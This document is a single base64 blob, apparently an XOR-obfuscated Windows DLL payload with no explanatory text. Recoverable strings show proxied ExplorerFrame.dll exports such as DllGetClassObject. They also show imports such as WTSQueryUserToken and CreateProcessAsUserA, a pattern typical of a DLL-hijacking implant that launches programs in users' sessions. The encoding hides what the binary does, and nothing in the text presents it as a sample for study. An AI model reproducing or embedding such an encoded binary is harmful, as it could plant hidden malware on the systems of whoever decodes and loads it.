XF8dEFRcrFhcXOXJzdmN2FxcbQhUXoxcXFzl+c3ZjdjMlFxcXF9dCFRcDFxcXOX5zdmN2MyQXFxcXw0IVF5MVFxc5fnN2Y3YzIxcXFxdPTxUXRR0XFzl+c3ZjdjMhFxcXFxdnFRdXGhcXOXN2Y3YXFxdXahUXtxcXFzlzdmN2M2UX92oVF48dFxc5dWRkFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX6Ojo6D2qFgcXFxcXIqoWBzUShA4VFxcXb1sVBxcXFxcXFxcXFxcXFxcXFxcXFxcXFhcXF+jo6Oh/qhYHNRKEDhYXFxe7WxUHFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcX6Ojo6JyqFgc1EoQOFhcXF89bFQcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjouaoWBxcXFxeuqhYHNRKEDhUXFxcTWhUHFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcX6Ojo6PuqFgc1EoQOFhcXFy9aFQcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoDqkWBzUShA4WFxcXc1oVBxcXFxcXFxcXFxcXFxcXFxcXFxcXFhcXF+jo6OhRqRYHNRKEDhYXFxeHWhUHFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcX6Ojo6G6pFgc1EoQOFhcXF6taFQcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjosakWBzUShA4WFxcX/1oVBxcXFxcXFxcXFxcXFxcXFxcXFxcXFhcXF+jo6OjOqRYHNRKEDhYXFxcDWRUHFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcX6ejo6BcXFxfP6OjoFxcXF+no6OhmshcHk7IXBxcXFxfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxdusBcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF+mwFwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OjEvxcH5b8XBxcXFxeBuRcHFxcXF9tZFQcVFxcXz1kVB+NZFQcHFxcXV2oVBxcXFxfo6OjoFxcXFxsXFxcTuRcHFxcXF0tqFQcXFxcX6Ojo6BcXFxcbFxcXfbkXBxcXFxeBuRcHFxcXFzdYFQcUFxcXJ1gVB89ZFQfjWRUHFxcXF29qFQcXFxcX6Ojo6BcXFxcbFxcXILkXBxcXFxfp6OjoFxcXF8/o6OgXFxcX6ejo6FikFwdPpBcHFxcXF+no6OgXFxcXz+jo6BcXFxfp6OjoXNwXB1jcFwcXFxcX6ejo6BcXFxfH6OjoFxcXF+no6OgXFxcXINoXBxcXFxfr2xcHEdoXB+no6OgXFxcXv+jo6BcXFxfp6OjoFxcXF/TUFwcXFxcXL9QXB1XUFwdXFxcXFxcXFxcXFxed0xcH6Ojo6BcXFxfo6OjoFxcXFxcXFxcXFxcXFhcXFxYXFxf3WBUHNRKEDhUXFxfnWBUHFhcXFxdHFQcXFxcXFxcXFxcXFxcWFxcX6ejo6BcXFxfH6OjoFxcXF+no6Ohl2xcHYdsXBxcXFxeBuRcHFxcXF3NHFQcVFxcXZ0cVB+NZFQcXFxcXr2oVBxcXFxfo6OjoFxcXFxsXFxdL1RcHFxcXF/Po6OgXFxcXw+jo6BcXFxfp6OjoiuEXB7rhFwcXFxcX6ejo6BcXFxfP6OjoFxcXF+no6OgXFxcX2eIXBxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxfi6hcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF7PqFwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXGxMWBxcXFxfz6OjoFxcXF8Po6OgXFxcX6ejo6FwTFgdYExYHFxcXF+no6OgXFxcXz+jo6BcXFxfp6OjoFxcXF5sGFgcXFxcX6ejo6BcXFxfP6OjoFxcXF+no6OgXFxcXnwUWBxcXFxfp6OjoFxcXF8/o6OgXFxcX6ejo6BcXFxf6BhYHFxcXF+no6OgXFxcXz+jo6BcXFxfp6OjoFxcXFy8FFgcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXEjQWBxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxfsMxYHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF8oiFgcXFxcX6ejo6BcXFxfP6OjoFxcXF+no6OgXFxcXHSYWBxcXFxfz6OjoFxcXF6/o6OgXFxcX6ejo6BcXFxe2KhYHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXFyQsFgcXFxcX6ejo6BcXFxfP6OjoFxcXF+no6OgXFxcXwCkWBxcXFxfp6OjoFxcXF6Po6OgXFxcX6ejo6BcXFxduKBYHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF8pRFgcXFxcX6ejo6BcXFxfH6OjoFxcXF+no6OgXFxcXOnYWBxcXFxfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxefcRYHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXFxpnFgcXFxcX6ejo6BcXFxfH6OjoFxcXF+no6OgXFxcX4mEWBxcXFxfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxevahYHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF8CHFgcXFxcX6ejo6BcXFxfP6OjoFxcXF+no6Og+thYHK7YWBxcXFxcXFxcX6Ojo6BcXFxc9QxUXFhcXFxIXFxcSFxcX70QVFxtDFRc3QxUX04QXF09DFReRQxUXo0MVF/9DFRdRQxUXb0MVF7VDFRfDQxUXKUMVFxYXFRcUFxMXFxdSb2d7eGVyZVFldnpyJCU5c3t7F155ZGN2e3sXU3t7UHJjVHt2ZGRYdX1ydGMXUm9ne3hlcmVRZXZ6cjlTe3tQcmNUe3ZkZFh1fXJ0YxdTe3tQcmNBcmVkfnh5F1JvZ3t4ZXJlUWV2enI5U3t7UHJjQXJlZH54eRdTe3tFcnB+ZGNyZURyZWFyZRdSb2d7eGVyZVFldnpyOVN7e0VycH5kY3JlRHJlYXJlF1N7e0J5ZXJwfmRjcmVEcmVhcmUXUm9ne3hlcmVRZXZ6cjlTe3tCeWVycH5kY3JlRHJlYXJlFxcXO0EVFxcXFxcXFxcX0UwVF0/XFhf3QBUXFxcXFxcXFxctSxUXG9UWFxNBFRcXFxcXFxcXF69LFRcn1xYXw0IVFxcXFxcXFxcXh0oVFxfXFhdbTxUXFxcXFxcXFxfXShUXb9UWF8dAFRcXFxcXFxcXFxFJFRfr1hYXF08VFxcXFxcXFxcXN0kVFzvVFhczQRUXFxcXFxcXFxdTSRUXR9cWFytPFRcXFxcXFxcXF4tJFRd/1RYXFxcXFxcXFxcXFxcXFxcXFxcXFxf7SxUXz0sVF5VKFRd5ShUXS0oVF11KFRcvShUXP0oVFwdKFRfrSxUX1UsVFxcXFxdRSxUXQUsVF7lLFReDSxUXk0sVF3lLFRd1SxUXFxcXFztJFRcXFxcX204VF89OFRfxThUX4U4VFxNNFRcFTRUXMU0VFyFNFRddTRUXTU0VF31NFRdpTRUXh00VF7dNFRe7TRUX000VF8lNFRfrTRUXG0wVFz9MFRcrTBUXQUwVF3FMFRdhTBUXn0wVF41MFRehTBUXm3UVF6lOFRd/dRUXQXUVF1F1FRcldRUXM3UVFw91FRcfdRUXuU4VF4lOFRedThUXbU4VF39OFRdLThUXUU4VFyNOFRcJThUXG04VF+lPFRfhTxUX908VF91PFRetTxUXiU8VF4dPFRdrTxUXZ08VF3NPFRfhdhUX83YVF912FRendhUXiXYVF5t2FReXdhUXjXUVF2N2FRd1dhUXWXYVFyl2FRdrdRUXT08VF71JFRfRSRUX80kVFxdIFRcDSBUXMUgVFy1IFRdDSBUXfUgVF5dIFReNSBUXp0gVF6tIFRfDSBUX8UgVF+FIFRcRdxUXCXcVFyF3FRdZdxUXYXcVF5V3FReHdxUXiXcVF793FRehdxUX33cVF813FRf/dxUX6XcVFx12FRcBdhUXN3YVFyd2FRcXFxcX90oVF91KFRfjShUXFxcXFwVLFRcTSxUX80wVF8NMFRcJSxUX5UwVFyVLFRcXFxcXABcXlxsXF5cHFxeXHhcXly4XF5cEFxeXHBcXl2QXF5cjFxeXFBcXlwNJFRdjFxeXExcXlwIXF5cXFxcXRUkVF31JFRdpSRUXFxcXF6dKFReJShUXFxcXF3sTRXJ2c1F+e3IXFyMRe2RjZXtyeUAXFx0RQGV+Y3JRfntyF5MSQ3Jlen55dmNyR2V4dHJkZBcXyxdUZXJ2Y3JHfmdyFxdIFlJvZ3Z5c1J5YX5leHl6cnljRGNlfnlwZFYXDBNHcnJ8WXZ6cnNHfmdyF9gSQHZ+Y1F4ZUR+eXB7clh1fXJ0Yxf/FFpie2N+VW5jckN4QH5zclR/dmUXYhJEe3JyZxeRF1R7eGRyX3Z5c3tyF9wVUHJjRGN2ZWNiZ155cXhWF+ESQH5zclR/dmVDeFpie2N+VW5jchfIF1RlcnZjckdleHRyZGRWFxd4FVByY1p4c2J7clF+e3JZdnpyVhcXyBRaeGFyUX57clYXDRJEcmNRfntyR3h+eWNyZRcXwRdUZXJ2Y3JaYmNyb1YXF2YVUHJjWnhzYntyX3Z5c3tyVhcX5hVQcmNDcnpnR3Zjf1YXF0oVUHJjW3ZkY1JlZXhlFxfVF1RlcnZjclF+e3JWFxkSRHJjUmFyeWMXFwcWU3J7cmNyUX57clYX5hdUZXJ2Y3JDf2VydnMXF6gTRXJkcmNSYXJ5YxcXUBVQcmNRfntyRH5tchf4FVByY0NyemdRfntyWXZ6clYXF6wXVGVydmNyUmFyeWNWFxdzFVByY1t4cH50dntTZX5hcmQXFz0VUHJjU2V+YXJDbmdyVhcaEkRyY1JlZXhlWnhzchcXMxVQcmNTfmR8UWVyckRndnRyVhdgFlF+eXNRfmVkY1F+e3JWFxefFlF+eXNZcm9jUX57clYXZBZRfnlzVHt4ZHIXfxZRfntyQ356ckN4RG5kY3J6Q356chcXcBZRfntyQ356ckN4W3h0dntRfntyQ356chcGEUBlfmNyR2V+YXZjckdleHF+e3JEY2VidGNWFxdJFVByY1t4dHZ7Q356chcXvxVQcmNHZX5hdmNyR2V4cX57ckRjZWJ0Y1YXFwIVUHJjVGJlZXJ5Y0dleHRyZGQXzxVQcmNEbmRjcnpTcnF2YntjW3Z5cF5TFxcBFFByY0FyZWR+eHlSb1YXyBVQcmNEbmRjcnpeeXF4F5sUXmRAeGAhI0dleHRyZGQXFzMTR2V4dHJkZCQlUX5lZGMXF+0XVGVydmNyQ3h4e39ye2ckJUR5dmdkf3hjFxcxE0dleHRyZGQkJVlyb2MXXFJFWVJbJCU5c3t7FxcKFERyY1RiZWR4ZUd4ZBcXxBR6eGJkckhyYXJ5YxdiFVp2Z0F+ZWNidntccm5WFxfFFHxybnVzSHJhcnljF+QVRXJ7cnZkclNUF6sWUHJjRG5kY3J6WnJjZX50ZBcXKBZQcmNTVBdCRFJFJCU5c3t7Fxd6FlNye3Jjclh1fXJ0YxcXfRZTcntyY3JTVBcXdBVQcmNTXlV+Y2QXJhdUZXJ2Y3JUeHpndmN+dXtyU1QXF10URHJ7cnRjWHV9cnRjFxcnF1RlcnZjclR4emd2Y351e3JVfmN6dmcXFwQXVX5jVXtjFxdQU14kJTlze3sXZxZQcmNDeHxyeV55cXhlenZjfnh5FwIVWGdyeUdleHRyZGRDeHxyeRcXbRZQcmNCZHJlWXZ6clYXF+YXU2Jne350dmNyQ3h8cnlSbxcXnRdUZXJ2Y3JHZXh0cmRkVmRCZHJlVhcXnBVFcnBYZ3J5XHJuUm9WF78VRXJwRHJjQXZ7YnJSb1YXF34VRXJwU3J7cmNyXHJuUm9WF3QVRXJwVGVydmNyXHJuUm9WF48VRXJwRmJyZW5BdnticlJvVhcXTBVFcnBUe3hkclxybhdWU0FWR14kJTlze3sXF94WRGNlfnlwUWV4elRbRF5TFzAXVHhUZXJ2Y3JQYn5zFxd4e3IkJTlze3sX6hdZcmNAfGRjdkJkcmVQcmNeeXF4F0YXWXJjVmd+VWJxcXJlUWVychcX4BdZcmNAfGRjdlByY155cXgXWVJDVkdeJCU5c3t7FxctF0BEVl54dGN7FxdARCVIJCU5c3t7FxcoF1ByY1ZzdmdjcmVkVnNzZXJkZHJkFxdeR19bR1ZHXjlTW1sXFwQXQENEUnlienJldmNyRHJkZH54eWRWFz4XQENERmJyZW5CZHJlQ3h8cnkXMhdAQ0RGYnJlbkRyZGR+eHleeXF4ZXp2Y354eVYXQENEVkdeJCU5c3t7FxeyEkJ5f3Z5c3tyc1JvdHJnY354eVF+e2NyZRcXchJEcmNCeX92eXN7cnNSb3RyZ2N+eHlRfntjcmUXlhReZEdleHRyZGR4ZVFydmNiZXJHZXJkcnljF20UXmRTcnVicHByZUdlcmRyeWMX2xVQcmNEY3ZlY2JnXnlxeEAXYxVQcmNaeHNie3Jfdnlze3JAFxdRE0ZicmVuR3JlcXhlenZ5dHJUeGJ5Y3JlFwEVUHJjVGJlZXJ5Y0dleHRyZGRecxcNFVByY1RiZWVyeWNDf2VydnNecxcX8hVQcmNEbmRjcnpDfnpyVmRRfntyQ356chdJFF55fmN+dnt+bXJEW35kY19ydnMX3BNFY3tCeWB+eXMXcBReeWNyZXt4dHxyc1F7YmR/RFt+ZGMXTBNFdn5kclJvdHJnY354eRcXPRJEcmNbdmRjUmVleGUXFzwWUnl0eHNyR3h+eWNyZRc4FlJ5Y3JlVGV+Y350dntEcnRjfnh5FxevFFtydmFyVGV+Y350dntEcnRjfnh5FxcZFlNye3JjclRlfmN+dHZ7RHJ0Y354eRdNFF55fmN+dnt+bXJUZX5jfnR2e0RydGN+eHlWeXNEZ355VHhieWMXgRJDe2RWe3t4dBcXjxJDe2RQcmNBdnticheOEkN7ZERyY0F2e2JyF4ASQ3tkUWVyche+FlFlcnJbfnVldmVuF70VUHJjR2V4dFZzc2VyZGQXF6kUW3h2c1t+dWV2ZW5Sb0AXF0sWUm9+Y0dleHRyZGQXZBVQcmNaeHNie3Jfdnlze3JSb0AXF1IUX3J2Z1FlcnIXF1YUX3J2Z1Z7e3h0F6cWUHJjVlRHFxfZFVByY0Rjc192eXN7chcXXRVQcmNRfntyQ25nche7FFtUWnZnRGNlfnlwQBcXbxZRfnlzUX5lZGNRfntyUm9WFxeRFF5kQXZ7fnNUeHNyR3ZwcheEFVByY1hSWlRHFxeoFlByY1RHXnlxeBfDFlByY1R4enp2eXNbfnlyVhfCFlByY1R4enp2eXNbfnlyQBckFVByY1J5YX5leHl6cnljRGNlfnlwZEAXF78WUWVyclJ5YX5leHl6cnljRGNlfnlwZEAXpxVQcmNHZXh0cmRkX3J2ZxcXxBVQcmNEY2V+eXBDbmdyQBcXVRJEcmNEY3Nfdnlze3IXF10UX3J2Z0R+bXIXF18UX3J2Z0VyVnt7eHQXihZRe2Jkf1F+e3JVYnFxcmVkFxf/FlByY1R4eWR4e3JURxcX7RZQcmNUeHlkeHtyWnhzchcXDBJEcmNRfntyR3h+eWNyZVJvFxcQFlNydHhzckd4fnljcmUX3RdUZXJ2Y3JRfntyQBceEUBlfmNyVHh5ZHh7ckAXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX6Ojo6FnxV6ymDqhTFhcXF3/SFgcP0xYHFhYXFwkWFxcYFxcX/94WB7fTFgcXFxcXCRcXFxgXFxcXFxcXD9IWBxcXFxcEFxcXEBcXFxcXFxfo6OjoFxcXFxcXFxcXFxcXNxKEDhcXFxcXFxcXFxcXFxUXFxcbFxcXHxcXF+jo6OgXFxcXFxcXFxcXFxcWNxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxU3FxcWFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFTcXFxUXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxc3ERUHFhcXFxcXFxcWFxcXFxcXFxcXFxcWFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxf/ZhUHFxcXFxcXFxcXFxcX/2YVBxcXFxcXFxcXFxcXF/9mFQcXFxcXFxcXFxcXFxf/ZhUHFxcXFxcXFxcXFxcX/2YVBxcXFxcXFxcXFxcXFxcXFxcXFxcXN2AVBxcXFxcXFxcXtx8VBzcdFQe36RYHFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXP2YVB+djFQdUFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHFxcXFxcXNzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3NzcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXdnV0c3JxcH9+fXx7enl4Z2ZlZGNiYWBvbm0XFxcXFxdWVVRTUlFQX15dXFtaWVhHRkVEQ0JBQE9OTRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcWFRMfFxcXF7MUFxd3lW6VNhcXFxcXFxexyBcXFxcXF7ayFxcXFxcXloj36xcXFxdXaZfrFxcXF78UFxfWtM20NxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXlukXFxcXFxdX6RcXFxcXF6IUFxfWtM20NxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXlukXFxcXFxdW6RcXFxcXF6EUFxfYtfO1DRfytf+1TBcXFxcXFxcXFxcXFxcXFxcXlukXFxcXFxdXabbpFxcXF0YSFxdGzUnNNxdIzX3NJRcXFxcXFxcXFxcXFxcXFxcXlsTPyffuFxcmaZbpFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHFxcXFxcXNzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3NzcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxd2dXRzcnFwf359fHt6eXhnZmVkY2JhYG9ubRcXFxcXF1ZVVFNSUVBfXl1cW1pZWEdGRURDQkFAT05NFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxfp6OjoORcXFzkXFxcXFxcXA2AVB9uQFQfbkBUH25AVB9uQFQfbkBUH25AVB9uQFQfbkBUH25AVB2hoaGhoaGhoD2AVB8eQFQfHkBUHx5AVB8eQFQfHkBUHx5AVB8eQFQfp6OjoFxcXFxcXFxcXFxcXYo8XFxcXFxcXFxcXFxcXFxYXFxcuJj42DgYeFi0lPTUNBR0VLCQ8NAwEHBQrIzszKCA4MAgAGBApITkxCQEZESoiOjIKAhoSCwMbExcXFxeXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX6urq6nN4YHkXFxcXFxcXFxcXFxdweHhwe3JIZHJlYX50cjl5ZCcmOWJkFxcXFxcXFxcXFxcXFxcXFxcXrBaKMCYnOSUkJzkmJjkmJxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxd9JiYgJi4XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXdmV2fH4kLiAgFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWGBYfGREcFBMeEBUaGxcSHRQaExAYFR8ZGxcWHREeHBIXGRAcHRMaFhIfGxEeFBUYGh8dFhQYExUcERAbFxIZHi0lPTUNBR0VKyM7MwsDGxMpITkxCQEZEVcvJz83DwcfLiY+Ng4GHhYsJDw0DAQcFCoiOjIKAhoSKCA4MAgAGBAQGhkUFxEeHRYVHxIcGxMYGh8cEhEYFxQTEBUbFh0ZHh0RHhcbHBAaGBYUGRIVHxMUGBcRHRYaHx4TEhwbEBUZGhUfExEYHBYdHhQZEhcbEBYYGh8dFBATGxIRHBcZHhUQHBMWHhsZFRcRHRoYFBIfFRYZEBMdHxoYGx4XFBIRHAcQAwIKGwsGFhgADRIFCB0VHw8ZNwwUHgQaCREBHBMOJTwzCgEYHxYkOzIJAAceFSM6MQgPBh0UIjk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